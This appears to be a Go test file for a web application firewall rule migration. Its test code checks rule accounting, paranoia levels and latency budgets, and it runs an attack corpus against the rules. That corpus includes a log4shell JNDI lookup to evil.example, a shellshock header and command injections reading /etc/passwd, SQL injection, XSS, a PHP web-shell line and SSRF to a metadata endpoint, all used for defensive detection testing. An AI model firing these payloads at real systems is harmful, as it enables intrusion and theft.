// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.
// SPDX-License-Identifier: MIT

package waf

import (
	"fmt"
	"net/url"
	"strconv"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/types"
)

// seededRuleIDs is the corpus as it existed in the waf_rules seed before the
// migration off SecLang. It is frozen here on purpose: it is the checklist the
// migration is audited against, and it must not be regenerated from the new
// code, or the audit would be circular.
var seededRuleIDs = []string{
	"1900300", "1900015", "1210001", "1210002", "1210003", "1210004",
	"1900001", "1900012", "1900013", "1900011", "1900010",
	"1900400", "1900401", "1900402",
	"1910000", "1910001", "1910002",
	"1900200", "1900201",
	"1100010", "1100011", "1100013", "1100014",
	"1100001", "1100002", "1100003", "1100012",
	"1100004", "1100005", "1100006", "1100007", "1100008", "1100009",
	"1110000", "1110001", "1110003", "1110002",
	"1120010", "1120011",
	"1130000", "1130001", "1130004", "1130002", "1130003",
	"1130005", "1130006", "1130007",
	"1140000", "1140002", "1140001",
	"1141000", "1141002", "1141001",
	"1150000", "1150001", "1150002",
	"1142000",
	"1151000", "1151001", "1151002",
	"1160000", "1170000", "1170001",
	"1151003", "1151004", "1151005",
	"1140003", "1120012", "1150003", "1110004",
	"1151006", "1151007", "1151008",
	"1180000", "1190000",
}

// TestEverySeededRuleIsAccountedFor is the audit that makes the migration
// safe. Every rule gateon used to seed must now be either a typed rule or an
// explicit retirement with a reason. A rule that is in neither table has been
// lost, and no compiler can tell us that — only this test can.
func TestEverySeededRuleIsAccountedFor(t *testing.T) {
	t.Parallel()

	converted := make(map[string]bool, len(defaultSpecs))
	for _, s := range defaultSpecs {
		converted[strconv.FormatUint(uint64(s.id), 10)] = true
	}

	for _, id := range seededRuleIDs {
		if converted[id] {
			continue
		}
		r, ok := RetirementByID(id)
		if !ok {
			t.Errorf("rule %s was seeded before the migration but is now neither "+
				"a typed rule nor a documented retirement", id)
			continue
		}
		if r.Why == "" {
			t.Errorf("rule %s is retired with no reason given", id)
		}
		if r.Disposition != DispositionDropped && r.Replacement == "" {
			t.Errorf("rule %s claims disposition %s but names no replacement",
				id, r.Disposition)
		}
	}
}

// TestNoRetirementShadowsALiveRule catches the opposite mistake: a rule listed
// as retired that is also still in the corpus would show the operator a
// "this is gone" note about a rule that is running.
func TestNoRetirementShadowsALiveRule(t *testing.T) {
	t.Parallel()

	live := make(map[string]bool, len(defaultSpecs))
	for _, s := range defaultSpecs {
		live[strconv.FormatUint(uint64(s.id), 10)] = true
	}
	for _, r := range Retirements {
		if live[r.ID] {
			t.Errorf("rule %s is documented as retired but is still in the corpus", r.ID)
		}
	}
}

// TestParanoiaLevelAgreesWithConfidence enforces the invariant that keeps a
// rule from being loaded by gateon and then silently discarded by gwaf: at the
// paranoia level a rule is assigned to, its confidence must clear the minimum
// that level implies.
func TestParanoiaLevelAgreesWithConfidence(t *testing.T) {
	t.Parallel()

	for _, s := range defaultSpecs {
		if s.pl < 1 || s.pl > 4 {
			t.Errorf("rule %d has paranoia level %d, outside 1-4", s.id, s.pl)
			continue
		}
		min := types.ConfidenceFromParanoiaLevel(s.pl)
		if !s.conf.AtLeast(min) {
			t.Errorf("rule %d is PL%d (minimum confidence %v) but declares %v, "+
				"so gateon would load it and gwaf would drop it",
				s.id, s.pl, min, s.conf)
		}
	}
}

// TestSpecsAreWellFormed checks the properties gwaf's compiler cannot: that
// every rule carries the metadata the dashboard and audit log depend on.
func TestSpecsAreWellFormed(t *testing.T) {
	t.Parallel()

	seen := make(map[uint32]bool, len(defaultSpecs))
	for _, s := range defaultSpecs {
		if seen[s.id] {
			t.Errorf("duplicate rule ID %d", s.id)
		}
		seen[s.id] = true

		if !types.RuleID(s.id).IsUser() {
			t.Errorf("rule %d is outside gwaf's embedder ID range", s.id)
		}
		if s.msg == "" {
			t.Errorf("rule %d has no message; a block would be unexplainable", s.id)
		}
		if s.category == "" {
			t.Errorf("rule %d has no category; it could not be disabled by category", s.id)
		}
		if len(s.tags) == 0 {
			t.Errorf("rule %d has no tags", s.id)
		}
		if len(s.targets) == 0 {
			t.Errorf("rule %d inspects nothing", s.id)
		}
		if s.op == nil {
			t.Errorf("rule %d has no operator", s.id)
		}
	}
}

// TestRulesetCompilesAtEveryParanoiaLevel proves the corpus is loadable. gwaf
// reports every compile problem rather than the first, so a failure here names
// all of them at once.
func TestRulesetCompilesAtEveryParanoiaLevel(t *testing.T) {
	t.Parallel()

	for pl := 1; pl <= 4; pl++ {
		p := Policy{ParanoiaLevel: pl, ResponseInspection: true}
		w, err := p.NewEngine()
		if err != nil {
			t.Fatalf("PL%d: %v", pl, err)
		}
		rep := w.Report()
		if rep.Rules == 0 {
			t.Fatalf("PL%d compiled an empty ruleset", pl)
		}
		t.Logf("PL%d: %d rules, %d prefiltered, %d unconditional, %d chain groups",
			pl, rep.Rules, rep.Prefiltered, len(rep.Unconditional), rep.ChainGroups)
	}
}

// TestUnconditionalRulesAreBudgeted holds the line on hot-path cost. A rule the
// prefilter cannot skip runs on every request in its phase, so the number of
// them is a latency budget, not an implementation detail. Raising this ceiling
// is a deliberate act that should show up in review.
func TestUnconditionalRulesAreBudgeted(t *testing.T) {
	t.Parallel()

	const ceiling = 4

	p := Policy{ParanoiaLevel: 1, ResponseInspection: true}
	w, err := p.NewEngine()
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	unconditional := w.Report().Unconditional
	for _, u := range unconditional {
		t.Logf("unconditional: rule %d phase %v operator %s (%s)",
			u.ID, u.Phase, u.Operator, u.Reason)
	}
	if len(unconditional) > ceiling {
		t.Errorf("%d unconditional rules at PL1, ceiling is %d; each one runs on "+
			"every request in its phase", len(unconditional), ceiling)
	}
}

// TestResponseRulesLoadOnlyWithInspection proves the tier gate works: response
// inspection is the most expensive part of the WAF, and a deployment that has
// not asked for it must not pay for the rules.
func TestResponseRulesLoadOnlyWithInspection(t *testing.T) {
	t.Parallel()

	off := Policy{ParanoiaLevel: 4, ResponseInspection: false}.Ruleset()
	for _, r := range off {
		if r.Phase == types.PhaseResponseBody {
			t.Errorf("rule %d is a response-body rule but loaded with inspection off", r.ID)
		}
	}

	on := Policy{ParanoiaLevel: 4, ResponseInspection: true}.Ruleset()
	if len(on) <= len(off) {
		t.Error("enabling response inspection loaded no additional rules")
	}
}

// TestCategoryAndTagDisablingWorks covers the control that carries WafConfig's
// disable_sqli, disable_xss and friends across the migration.
func TestCategoryAndTagDisablingWorks(t *testing.T) {
	t.Parallel()

	base := Policy{ParanoiaLevel: 4, ResponseInspection: true}
	full := len(base.Ruleset())

	noSQLi := base
	noSQLi.DisabledCategories = map[string]bool{"SQLi": true}
	if got := len(noSQLi.Ruleset()); got >= full {
		t.Errorf("disabling the SQLi category changed nothing: %d of %d", got, full)
	}
	for _, r := range noSQLi.Ruleset() {
		for _, tag := range r.Tags {
			if tag == "attack-sqli" {
				t.Errorf("rule %d survived the SQLi category being disabled", r.ID)
			}
		}
	}

	noDLP := base
	noDLP.DisabledTags = map[string]bool{"dlp": true}
	for _, r := range noDLP.Ruleset() {
		for _, tag := range r.Tags {
			if tag == "dlp" {
				t.Errorf("rule %d survived the dlp tag being disabled", r.ID)
			}
		}
	}
}

// TestThresholdScalesWithReputation pins the behaviour that four SecLang rules
// used to encode by mutating a transaction variable in load order.
func TestThresholdScalesWithReputation(t *testing.T) {
	t.Parallel()

	p := Policy{AnomalyThreshold: 5}
	for _, tc := range []struct {
		reputation float64
		want       int
	}{
		{100, 15}, {95, 15}, {90, 12}, {80, 12},
		{50, 10}, {40, 10}, {20, 7}, {15, 7},
		{10, 5}, {0, 5},
	} {
		if got := p.ThresholdFor(tc.reputation); got != tc.want {
			t.Errorf("ThresholdFor(%v) = %d, want %d", tc.reputation, got, tc.want)
		}
	}

	// A configured threshold above the reputation floor must win: an operator
	// who raised the threshold did so deliberately.
	strict := Policy{AnomalyThreshold: 20}
	if got := strict.ThresholdFor(100); got != 20 {
		t.Errorf("a configured threshold of 20 was lowered to %d by reputation", got)
	}
}

// --------------------------------------------------------------- attack corpus

// attack is one payload that a named rule must refuse. The corpus is the real
// regression suite for the migration: it proves each converted rule still
// detects what its SecLang original detected, including that its prefilter
// literal hints are honest — a wrong hint makes the rule silently stop firing,
// and this is what catches that.
type attack struct {
	rule        uint32
	name        string
	method      string
	target      string
	header      [2]string
	body        string
	contentType string
	upload      [2]string // filename, content -- rendered as a multipart body
	resp        string
}

// multipartUpload builds a minimal multipart body carrying one uploaded file.
// It matters that this is a real multipart payload rather than a form-encoded
// one: gwaf records an upload's filename in the argument-*names* collection and
// its content in the values, which is what the file-extension rules inspect. A
// form-encoded "file=evil.php" puts the name where the rule does not look and
// would pass while the real attack is caught, or vice versa.
func multipartUpload(filename, content string) (body, contentType string) {
	const boundary = "----gateonTestBoundary7f3a"
	body = "--" + boundary + "\r\n" +
		`Content-Disposition: form-data; name="upload"; filename="` + filename + `"` + "\r\n" +
		"Content-Type: application/octet-stream\r\n\r\n" +
		content + "\r\n" +
		"--" + boundary + "--\r\n"
	return body, "multipart/form-data; boundary=" + boundary
}

var attackCorpus = []attack{
	{rule: 1210002, name: "malicious javascript", target: "/?q=String.fromCharCode(88)"},
	{rule: 1210003, name: "php superglobal", target: "/?q=$_REQUEST[cmd]"},
	{rule: 1210004, name: "upload exec extension", target: "/uploads/evil.phtml"},
	{rule: 1100010, name: "go injection", target: "/?q=reflect.ValueOf(x)"},
	{rule: 1100011, name: "java injection", target: "/?q=java.lang.Runtime.exec"},
	{rule: 1100014, name: "shellshock", header: [2]string{"User-Agent", "() { :; }; /bin/cat /etc/passwd"}},
	{rule: 1151000, name: "log4shell", target: "/?q=${jndi:ldap://evil.example/a}"},
	{rule: 1151001, name: "spring4shell", target: "/?class.module.classLoader.x=1"},
	{rule: 1151005, name: "goanywhere", target: "/goanywhere/licensing/accept"},
	{rule: 1151006, name: "text4shell", target: "/?q=${script:javascript:1}"},
	{rule: 1151007, name: "follina", target: "/?q=ms-msdt:/id%20IT_BrowseForFile"},
	{rule: 1151003, name: "traversal in arg name", target: "/?../../etc/passwd=1"},
	{rule: 1140000, name: "time-based sqli", target: "/?id=1+and+sleep(5)"},
	{rule: 1140002, name: "schema enumeration", target: "/?id=information_schema.tables"},
	{rule: 1140003, name: "moveit header", header: [2]string{"X-siis-session-id", "anything"}},
	{rule: 1141000, name: "xss script tag", target: "/?q=%3Cscript%3Ealert(1)%3C/script%3E"},
	{rule: 1141002, name: "xss obfuscation", target: "/?q=eval%28x.atob%28y%29%29"},
	{rule: 1170000, name: "prototype pollution", target: "/?__proto__[x]=1"},
	{rule: 1150001, name: "null byte", target: "/?q=a%00b"},
	{rule: 1150000, name: "excessive path depth", target: "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q"},
	{rule: 1100004, name: "upload dangerous ext", upload: [2]string{"evil.php", "harmless"}},
	{rule: 1100005, name: "php in upload", upload: [2]string{"note.txt", "<?php system($_GET[c]);"}},
	{rule: 1100007, name: "ransomware extension", upload: [2]string{"report.lockbit", "data"}},
	{rule: 1100008, name: "web shell filename", target: "/uploads/c99.php"},
	{rule: 1100009, name: "ransom note", target: "/READ_ME.txt"},
	{rule: 1110000, name: "scanner user agent", header: [2]string{"User-Agent", "sqlmap/1.7"}},
	{rule: 1110001, name: "scanner header", header: [2]string{"X-Scanner", "acunetix"}},
	{rule: 1110002, name: "web shell search", target: "/tools/bash.py"},
	{rule: 1110004, name: "sensitive file", target: "/.env"},
	{rule: 1100003, name: "wp plugin exec", target: "/wp-content/plugins/x/evil.php"},
	{rule: 1100012, name: "wp user enumeration", target: "/wp-json/wp/v2/users"},
	{rule: 1190000, name: "crypto miner", target: "/?src=coinhive.min.js"},
	{rule: 1130002, name: "private key leak", resp: "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n"},
	{rule: 1130003, name: "aws key leak", resp: `{"key":"AKIAIOSFODNN7EXAMPLE"}`},
	{rule: 1130004, name: "google api key leak", resp: `{"k":"AIzaSyA12345678901234567890123456789012"}`},
	{rule: 1130005, name: "slack webhook leak", resp: "https://hooks.slack.com/services/T1/B2/xyz"},
	{rule: 1130006, name: "github pat leak", resp: "ghp_abcdefghijklmnopqrstuvwxyz0123456789"},
	{rule: 1130007, name: "google oauth secret leak", resp: "GOCSPX-abcdefghijklmnopqrstuvwxyz12"},
	{rule: 1130000, name: "card number leak", resp: `{"pan":"4111111111111111"}`},
	{rule: 1130001, name: "ssn leak", resp: `{"ssn":"123-45-6789"}`},
	// PL2 and PL3 rules, exercised at the level that loads them.
	{rule: 1210001, name: "gambling content", target: "/?q=sportsbook"},
	{rule: 1141001, name: "html tag injection", target: "/?q=%3Ciframe+src%3Dx%3E"},
	{rule: 1160000, name: "nosql injection", target: "/?filter=$where"},
	{rule: 1170001, name: "advanced prototype pollution", target: "/?q=constructor%5Bprototype%5D"},
	{rule: 1150003, name: "ssrf metadata", target: "/?url=http://169.254.169.254/latest"},
	{rule: 1140001, name: "sqli auth bypass", target: "/?u=admin'+or+'1'%3D'1"},
	{rule: 1151002, name: "command injection", target: "/?q=x%3B+cat+/etc/passwd"},
	{rule: 1151004, name: "spel injection", target: "/?q=%23%7B7*7%7D"},
	{rule: 1151008, name: "advanced shell injection", target: "/?q=x%3B+base64+/etc/passwd"},
	{rule: 1142000, name: "ransomware keyword", upload: [2]string{"note.txt", "your files ransom bitcoin"}},
	{rule: 1110003, name: "automated client", header: [2]string{"User-Agent", "python-requests/2.31"}},
}

// TestAttackCorpusIsDetected runs every payload at the paranoia level that
// loads its rule and requires that rule specifically to fire.
//
// It asserts the rule ID rather than merely "something blocked", because a
// broken literal hint shows up as the intended rule going quiet while an
// unrelated one still catches the payload — which would look like a pass.
func TestAttackCorpusIsDetected(t *testing.T) {
	t.Parallel()

	byID := make(map[uint32]spec, len(defaultSpecs))
	for _, s := range defaultSpecs {
		byID[s.id] = s
	}

	for _, a := range attackCorpus {
		t.Run(fmt.Sprintf("%d_%s", a.rule, a.name), func(t *testing.T) {
			t.Parallel()

			s, ok := byID[a.rule]
			if !ok {
				t.Fatalf("corpus references rule %d, which is not in the ruleset", a.rule)
			}

			p := Policy{
				ParanoiaLevel:      s.pl,
				ResponseInspection: true,
				DetectionOnly:      true, // observe every match, not just the first block
				// Isolate gateon's corpus. gwaf's core rules cover much of the
				// same ground and blocking is terminal, so with the core loaded
				// a core rule fires first and the gateon rule under test is
				// never evaluated — which would read as a pass while the rule
				// was in fact broken.
				CoreRulesetDisabled: true,
			}
			w, err := p.NewEngine()
			if err != nil {
				t.Fatalf("NewEngine: %v", err)
			}

			matched := runAttack(t, w, a)
			if !matched[a.rule] {
				t.Errorf("rule %d (%s) did not fire on %q; fired instead: %v",
					a.rule, s.msg, describe(a), keys(matched))
			}
		})
	}
}

// TestBenignCorpusIsNotBlocked is the other half. A WAF that blocks everything
// passes an attack corpus, so the false-positive corpus is what makes the
// attack corpus mean anything.
func TestBenignCorpusIsNotBlocked(t *testing.T) {
	t.Parallel()

	benign := []attack{
		{name: "product listing", target: "/products?category=shoes&sort=price&page=2"},
		{name: "search query", target: "/search?q=how+to+use+the+api"},
		{name: "uuid path", target: "/orders/3f2504e0-4f89-11d3-9a0c-0305e82c3301"},
		{name: "iso date filter", target: "/reports?from=2026-01-01&to=2026-06-30"},
		{name: "browser user agent", target: "/", header: [2]string{"User-Agent",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"}},
		{name: "json body", target: "/api/orders", method: "POST",
			body: `{"item":"widget","quantity":3,"note":"deliver to the front desk"}`},
		{name: "form post", target: "/contact", method: "POST",
			body: "name=Alex+Chen&message=Please+call+me+back+about+my+order"},
		{name: "documentation path", target: "/docs/guides/getting-started"},
		{name: "asset with hash", target: "/static/app.9f8a7b6c.js"},
		{name: "pagination cursor", target: "/feed?cursor=eyJpZCI6MTIzfQ"},
		{name: "benign response", target: "/api/me", resp: `{"id":42,"name":"Alex"}`},
		{name: "price in response", target: "/api/cart", resp: `{"total":4111.11,"currency":"USD"}`},
	}

	for pl := 1; pl <= 2; pl++ {
		p := Policy{ParanoiaLevel: pl, ResponseInspection: true}
		w, err := p.NewEngine()
		if err != nil {
			t.Fatalf("PL%d: %v", pl, err)
		}
		for _, b := range benign {
			t.Run(fmt.Sprintf("PL%d_%s", pl, b.name), func(t *testing.T) {
				if fired := runAttack(t, w, b); len(fired) > 0 {
					t.Errorf("benign request %q matched rules %v", describe(b), keys(fired))
				}
			})
		}
	}
}

// runAttack drives one request through every phase and returns the set of rule
// IDs that matched.
func runAttack(t *testing.T, w *gwaf.WAF, a attack) map[uint32]bool {
	t.Helper()

	tx := w.NewTransaction()
	defer tx.Close()

	fired := make(map[uint32]bool)
	collect := func() {
		for _, m := range tx.Matches() {
			fired[uint32(m.RuleID)] = true
		}
	}

	method := a.method
	if method == "" {
		method = "GET"
		if a.body != "" || a.upload[0] != "" {
			method = "POST"
		}
	}
	target := a.target
	if target == "" {
		target = "/"
	}

	tx.SetRemoteAddr("203.0.113.10:44321")
	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.AddRequestHeader("Host", "app.example.com")
	if a.header[0] != "" {
		tx.AddRequestHeader(a.header[0], a.header[1])
	}
	body, ct := a.body, a.contentType
	if a.upload[0] != "" {
		body, ct = multipartUpload(a.upload[0], a.upload[1])
	}
	if body != "" {
		if ct == "" {
			ct = "application/x-www-form-urlencoded"
			if body[0] == '{' {
				ct = "application/json"
			}
		}
		tx.AddRequestHeader("Content-Type", ct)
	}
	tx.ProcessRequestHeaders()
	collect()

	// The request-body phase runs whether or not there is a body. Query
	// arguments are recorded during SetRequestLine but remain visible in phase
	// two, so a rule targeting ARGS — which is most of the corpus, matching the
	// SecLang originals' phase:2 — only fires if this phase is evaluated. The
	// middleware has the same obligation; see engine.go.
	if body != "" {
		tx.SetRequestBody([]byte(body))
	}
	tx.ProcessRequestBody()
	collect()

	if a.resp != "" {
		tx.SetResponseStatus(200)
		tx.AddResponseHeader("Content-Type", "application/json")
		tx.ProcessResponseHeaders()
		collect()
		tx.WriteResponseBody([]byte(a.resp))
		tx.ProcessResponseBody()
		collect()
	}
	return fired
}

func describe(a attack) string {
	d := a.target
	if a.header[0] != "" {
		d += fmt.Sprintf(" [%s: %s]", a.header[0], a.header[1])
	}
	if a.body != "" {
		d += " body=" + a.body
	}
	if a.resp != "" {
		d += " resp=" + a.resp
	}
	if u, err := url.QueryUnescape(d); err == nil {
		return u
	}
	return d
}

func keys(m map[uint32]bool) []uint32 {
	out := make([]uint32, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
